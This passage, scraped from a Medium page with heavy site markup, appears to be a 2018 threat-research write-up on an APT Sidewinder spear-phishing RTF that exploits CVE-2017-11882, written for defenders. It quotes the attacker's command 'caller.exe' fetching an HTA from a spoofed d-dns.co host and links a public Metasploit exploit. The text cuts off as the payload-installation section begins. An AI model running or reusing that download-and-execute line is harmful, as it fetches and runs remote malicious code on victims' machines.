6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav------------------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" href="https://medium.com/search?source=---top_nav_layout_nav-----------------------------------------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="l"><div class="fu fv fw fx fy l"><div class="ab cb"><div class="ci bh fz ga gb gc"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gi gj gk gl gm"></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><div><h1 id="b4a6" class="pw-post-title gs gt gu bf gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu bk" data-testid="storyTitle">APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading</h1><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="hv hw hx hy hz ab"><div><div class="ab ia"><div><div class="bm" aria-hidden="false"><a rel="noopener follow" href="/?source=post_page---byline--5bc1a7e7c84c---------------------------------------"><div class="l ib ic by id ie"><div class="l fj"><img alt="Sebdraven" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/1*ycwwStTvoVxriAE2No5ipQ.jpeg" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="if by l dd de fs n ig ft"></div></div></div></a></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="ih ab q"><div class="ab q ii"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b ij ik bk"><a class="af ag ah ai aj ak al am an ao ap aq ar il" data-testid="authorName" rel="noopener follow" href="/?source=post_page---byline--5bc1a7e7c84c---------------------------------------">Sebdraven</a></p></div></div></div><span class="im in" aria-hidden="true"><span class="bf b bg z bk">·</span></span><p class="bf b ij ik bk"><span><a class="af ag ah ai aj ak al am an ao ap aq ar io" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F11d98531eebe&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;user=Sebdraven&amp;userId=11d98531eebe&amp;source=post_page-11d98531eebe--byline--5bc1a7e7c84c---------------------post_header------------------" rel="noopener follow">Follow</a></span></p></div></div></span></div></div><div class="l ip"><span class="bf b bg z du"><div class="ab cn iq ir is"><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">7 min read</span><div class="it iu l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div><span data-testid="storyPublishDate">Jul 16, 2018</span></div></span></div></span></div></div></div><div class="ab cp iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk"><div class="h k w fg fh q"><div class="ka l"><div class="ab q kb kc"><div class="pw-multi-vote-icon fj kd ke kf kg"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;user=Sebdraven&amp;userId=11d98531eebe&amp;source=---header_actions--5bc1a7e7c84c---------------------clap_footer------------------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kh ao ki kj kk kl am km kn ko kg"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l kp kq kr ks kt ku kv"><p class="bf b dv z du"><span class="kw">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao kh kx ky ab q fk kz la" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lb"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q jl jm jn jo jp jq jr js jt ju jv jw jx jy jz"><div class="lc k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;source=---header_actions--5bc1a7e7c84c---------------------bookmark_footer------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du ld" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd le cn"><div class="l ae"><div class="ab cb"><div class="lf lg lh li lj lk ci bh"><div class="ab"><div class="bm" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al ll an ao ap ex lm ln la lo lp lq lr ls s lt lu lv lw lx ly lz u ma mb mc"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al ll an ao ap ex lm ln la lo lp lq lr ls s lt lu lv lw lx ly lz u ma mb mc"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><h1 id="73e7" class="md me gu bf mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na bk"><span class="l nb nc nd bo ne nf ng nh ni fj">S</span>pear phishing</h1><p id="a25c" class="pw-post-body-paragraph nj nk gu nl b nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og gn bk">I’ve started few days ago an analysis on a RTF following my recent researches.</p><p id="4ce6" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">I found it this: 892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488</p><p id="9ab8" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">I execute rtfobj on it and two ole embedded objects malforfed:</p><figure class="op oq or os ot ou om on paragraph-image"><div role="button" tabindex="0" class="ov ow fj ox bh oy"><div class="om on oo"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*clv0SwElLXu5uycgGlttAA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*clv0SwElLXu5uycgGlttAA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*clv0SwElLXu5uycgGlttAA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*clv0SwElLXu5uycgGlttAA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*clv0SwElLXu5uycgGlttAA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*clv0SwElLXu5uycgGlttAA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*clv0SwElLXu5uycgGlttAA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*clv0SwElLXu5uycgGlttAA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*clv0SwElLXu5uycgGlttAA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*clv0SwElLXu5uycgGlttAA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*clv0SwElLXu5uycgGlttAA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*clv0SwElLXu5uycgGlttAA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*clv0SwElLXu5uycgGlttAA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*clv0SwElLXu5uycgGlttAA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lk oz c" width="700" height="131" loading="lazy" role="presentation"/></picture></div></div></figure><p id="e410" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">But rtfobj extracts succeffully two raws objects:</p><figure class="op oq or os ot ou om on paragraph-image"><div role="button" tabindex="0" class="ov ow fj ox bh oy"><div class="om on pa"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*RoH4AT4fAqfiiy4hO3C8DA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*RoH4AT4fAqfiiy4hO3C8DA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*RoH4AT4fAqfiiy4hO3C8DA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*RoH4AT4fAqfiiy4hO3C8DA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*RoH4AT4fAqfiiy4hO3C8DA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*RoH4AT4fAqfiiy4hO3C8DA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*RoH4AT4fAqfiiy4hO3C8DA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lk oz c" width="700" height="36" loading="lazy" role="presentation"/></picture></div></div></figure><p id="6ef7" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The object 6A2A1 is very interesting:</p><figure class="op oq or os ot ou om on paragraph-image"><div role="button" tabindex="0" class="ov ow fj ox bh oy"><div class="om on pb"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*jg292b2dNzrsJddVxaqeuQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*jg292b2dNzrsJddVxaqeuQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*jg292b2dNzrsJddVxaqeuQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*jg292b2dNzrsJddVxaqeuQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*jg292b2dNzrsJddVxaqeuQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*jg292b2dNzrsJddVxaqeuQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*jg292b2dNzrsJddVxaqeuQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lk oz c" width="700" height="297" loading="lazy" role="presentation"/></picture></div></div></figure><p id="bc36" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">and this one:</p><figure class="op oq or os ot ou om on paragraph-image"><div role="button" tabindex="0" class="ov ow fj ox bh oy"><div class="om on pc"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*irGqF14uiBKgitbGYHGjNg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*irGqF14uiBKgitbGYHGjNg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*irGqF14uiBKgitbGYHGjNg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*irGqF14uiBKgitbGYHGjNg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*irGqF14uiBKgitbGYHGjNg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*irGqF14uiBKgitbGYHGjNg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*irGqF14uiBKgitbGYHGjNg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lk oz c" width="700" height="128" loading="lazy" role="presentation"/></picture></div></div></figure><p id="2cc5" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">In fact, the ole object is a exploit of CVE-2017–11882.</p><p id="c509" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The implementation is a bit different than my last article, there is not an object MTF.</p><p id="6fe4" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The implementation has many matching with the public exploit: <a class="af io" href="https://github.com/0x09AL/CVE-2017-11882-metasploit" rel="noopener ugc nofollow" target="_blank">https://github.com/0x09AL/CVE-2017-11882-metasploit</a></p><p id="2bdb" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The exploitation is the following:</p><p id="5e00" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">an hta is downloaded here and lauched by msthll.dll.RunHMLApplication.</p><p id="af13" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">caller.exe <a class="af io" href="http://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta" rel="noopener ugc nofollow" target="_blank">hxxp://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta</a></p><p id="9584" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The hta is a mix of powershell, vbscript and javascript.</p><h1 id="a5f5" class="md me gu bf mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na bk">Installation of payload and Persistance</h1><p id="654b" class="pw-post-body-paragraph nj nk gu nl b nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og gn bk">The installation of the payload made by vscript a line 151</p><p id="e570" class="pw-post-body-paragraph nj nk gu nl b nm 